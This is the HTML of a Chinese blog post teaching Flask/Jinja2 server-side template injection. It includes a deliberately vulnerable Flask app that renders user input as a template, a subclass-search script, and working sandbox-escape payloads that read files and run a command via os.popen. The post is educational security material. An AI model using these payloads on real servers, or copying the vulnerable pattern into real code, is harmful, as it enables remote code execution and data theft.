@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"edwatering.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01前言本文主要介绍笔者在学习 Flask SSTI相关知识时，无意中解锁了新姿势。在研究原理后，从中挖掘出新的奇怪知识点~  0x02前置知识Flask 和 SSTI 介绍">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于Flask SSTI，解锁你不知道的新姿势">
+<meta property="og:url" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="Edwater&#39;s Blog">
+<meta property="og:description" content="0x01前言本文主要介绍笔者在学习 Flask SSTI相关知识时，无意中解锁了新姿势。在研究原理后，从中挖掘出新的奇怪知识点~  0x02前置知识Flask 和 SSTI 介绍">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image1.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image2.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image3.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image4.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image6.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image7.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image8.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image9.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image10.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image11.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image12.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image13.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image14.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image15.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image16.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image17.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image18.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image19.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image20.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image21.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image22.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image23.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image24.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image25.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image26.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image27.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image28.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image29.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image30.jpeg">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image31.png">
+<meta property="og:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image33.jpeg">
+<meta property="article:published_time" content="2020-07-01T11:00:00.000Z">
+<meta property="article:author" content="Edwater">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="模板注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image1.jpeg">
+
+<link rel="canonical" href="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于Flask SSTI，解锁你不知道的新姿势 | Edwater's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Edwater's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">3</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://edwatering.github.io/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Edwater">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Edwater's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于Flask SSTI，解锁你不知道的新姿势
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-01 19:00:00" itemprop="dateCreated datePublished" datetime="2020-07-01T19:00:00+08:00">2020-07-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0/" itemprop="url" rel="index"><span itemprop="name">公众号文章</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>本文主要介绍笔者在学习 Flask SSTI<br>相关知识时，无意中解锁了新姿势。在研究原理后，从中挖掘出新的奇怪知识点~</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image1.jpeg"></p>
+<h2 id="0x02前置知识"><a href="#0x02前置知识" class="headerlink" title="0x02前置知识"></a>0x02前置知识</h2><h3 id="Flask-和-SSTI-介绍"><a href="#Flask-和-SSTI-介绍" class="headerlink" title="Flask 和 SSTI 介绍"></a>Flask 和 SSTI 介绍</h3><p><strong>Flask</strong> 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI<br>工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image2.png"></p>
+<p><strong>SSTI</strong> (Server-Side Template<br>Injection)，即服务端模板注入攻击。通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者<br>getshell 的目的。</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image3.png"></p>
+<h3 id="jinja2-语法"><a href="#jinja2-语法" class="headerlink" title="jinja2 语法"></a>jinja2 语法</h3><p>在 jinja2 中，存在三种语法：</p>
+<pre><code>控制结构 &#123;% %&#125;
+变量取值 &#123;&#123; &#125;&#125;
+注释 &#123;# #&#125;
+</code></pre>
+<p>jinja2 模板中使用 <code>&#123;&#123; &#125;&#125;</code><br>语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2<br>支持 Python 中所有的 Python 数据类型比如列表、字段、对象等。 jinja2<br>中的过滤器可以理解为是 jinja2 里面的内置函数和字符串处理函数。<br>被两个括号包裹的内容会输出其表达式的值。</p>
+<h3 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h3><p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image4.jpeg"></p>
+<p>jinja2 的 Python<br>模板解释器在构建的时候考虑到了安全问题，删除了大部分敏感函数，相当于构建了一个沙箱环境。但是一些内置函数和属性还是依然可以使用，而<br>Flask 的 SSTI<br>就是利用这些内置函数和属性相互组建来达到调用函数的目的，从而绕过沙箱。</p>
+<p><strong>函数和属性解析:</strong></p>
+<pre><code>__class__         返回调用的参数类型
+__bases__         返回基类列表
+__mro__           此属性是在方法解析期间寻找基类时的参考类元组
+__subclasses__()  返回子类的列表
+__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变量 与 func_globals 等价
+__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等
+</code></pre>
+<p><strong>获取 object 类:</strong></p>
+<pre><code>&#39;&#39;.__class__.__mro__[2]     # 在 python2 中字符串在考虑解析时会有三个参考类 str basestring object
+&#39;&#39;.__class__.__mro__[1]     # 在 python3 中字符串在考虑解析时会有两个参考类 str object
+&#123;&#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+</code></pre>
+<h2 id="0x03原理解读"><a href="#0x03原理解读" class="headerlink" title="0x03原理解读"></a>0x03原理解读</h2><h3 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h3><p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image6.jpeg"></p>
+<p>先来看下一个简单的 Flask SSTI 的实例：</p>
+<pre><code>from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get(&#39;name&#39;, &#39;guest&#39;)
+    t = Template(&quot;Hello &quot; + name)             # 创建模板
+    return t.render()                         # 渲染
+
+if __name__ == &quot;__main__&quot;:
+    app.run();                                # 启动 flask ，默认 5000 端口
+</code></pre>
+<p>代码很简单，就是访问主页的时候 name 参数会被渲染到页面。</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image7.png" alt="pic2"></p>
+<p>可以看出来到这里有个反射型 XSS ，的确如此 XSS 就是这个位置有可能有 SSTI<br>的前奏。</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image8.png" alt="pic3"></p>
+<p>name参数后边也可以输入表达式之类的，例如:</p>
+<pre><code>name=&#123;&#123;2*2&#125;&#125; 
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image9.png" alt="pic4"></p>
+<pre><code>name=&#123;&#123;'abc'.upper()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image10.png" alt="pic5"></p>
+<p>可以看到取表达式的值是可以成功的。但是一旦直接调用普通函数就会报错：</p>
+<pre><code>name=&#123;&#123;abs(-1)&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image11.png" alt="pic6"></p>
+<p>后台显示 abs 未定义：</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image12.png" alt="pic7"></p>
+<h3 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h3><p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image13.jpeg"></p>
+<p>我们来尝试获取 “()” 的类型：</p>
+<pre><code>name=&#123;&#123;().__class__.__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image14.png" alt="pic8"></p>
+<p>成功获取 “()” 的类型 tuple（元组） 。我们知道 Python<br>中所有类型的其实都是 object 类型，所以下面我们继续尝试： 获取到 object<br>类型：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image15.png" alt="pic9"></p>
+<p>获取到 object 的所有子类：</p>
+<pre><code>name=&#123;&#123;''.__class__.__mro__[1].__subclasses__().__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image16.png" alt="pic10"></p>
+<p>发现子类型有很多，在这里我们需要找到内建模块中含有 eval 或者 open<br>的类型来使我们可以执行代码或读取文件。 查找脚本如下：</p>
+<pre><code>code = &#39;eval&#39;             # 查找包含 eval 函数的内建模块的类型
+i = 0
+for c in ().__class__.__base__.__subclasses__():
+    if hasattr(c,&#39;__init__&#39;) and hasattr(c.__init__,&#39;__globals__&#39;) and c.__init__.__globals__[&#39;__builtins__&#39;] and c.__init__.__globals__[&#39;__builtins__&#39;][code]:
+        print(&#39;&#123;&#125; &#123;&#125;&#39;.format(i,c))
+    i = i + 1
+</code></pre>
+<p>运行结果：</p>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image17.png" alt="pic11"></p>
+<p>在Python 2/3 版本中有这么多类型的内建模块中都包含 eval<br>。这里为了让最后的结果同时兼容 Python 2/3 版本我们使用索引为 77 的类型：<br>class ‘site.Quitter’ 。</p>
+<p>我们看看在这个 class ‘site.Quitter’ 的 global 环境下都可以执行那些函数：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image18.png" alt="pic12"></p>
+<p>可以看到几个敏感函数<br>eval、open、file等等，应有尽有。这样我们就可以做很多我们想做的事了。</p>
+<p>执行代码 abs(-1):</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('abs(-1)')&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image19.png" alt="pic13"></p>
+<p>看到 abs(-1)<br>已经执行成功，至此我们已经成功绕过了沙箱，执行了本不可执行的代码。</p>
+<p><strong>常用可兼容Python 2/3 版本的 Payload：</strong><br>读取文件：</p>
+<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['open']("C:\Windows\win.ini").read()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/01/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image20.png" alt="pic20"></p>
+<p>命令执行：</p>
+<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
+</code></pre>
